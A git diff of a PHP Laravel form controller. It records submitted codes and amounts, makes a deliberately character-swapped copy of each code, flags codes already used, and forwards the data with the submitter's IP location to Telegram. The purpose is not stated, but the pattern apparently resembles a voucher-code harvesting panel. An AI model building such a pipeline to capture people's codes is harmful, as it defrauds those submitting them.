@@ -59,17 +59,14 @@ class FormDataController extends Controller implements HasMiddleware
             $invertedCode = swap_adjacent_random_char($validated['code']);
         }
 
-        // $entries = [];
-        // foreach ($formData->entries ?? [] as $key => $value) {
-        //     $newKey = str_replace(' ', '_', strtolower($key));
-        //     $entries[$newKey] = $value;
-        // }
+        $exist = FormData::where('data->code', $validated['code'])->exists();
 
         $formData = FormData::create([
             'data' => [
                 ...$validated,
                 'is_inverted' => (bool) ($validated['code'] !== $invertedCode),
                 'inverted_code' => $invertedCode,
+                'already_used' => $exist,
             ],
             'entries' => $request->except('type', 'code', 'amount'),
             'ip_address' => $request->ip(),
@@ -82,7 +79,7 @@ class FormDataController extends Controller implements HasMiddleware
 
         $notifData = new NotifData("👉 <b>" . $validated['code'] . "</b>");
         $notifData->setSubject('A new form data has been submitted');
-        $notifData->setBody(json_encode($validated, JSON_PRETTY_PRINT));
+        $notifData->setBody(json_encode($formData->data, JSON_PRETTY_PRINT));
         TelegramMsgJob::dispatchSync($notifData);
         SetLocation::dispatch($request->ip(), $formData, 'location');
 
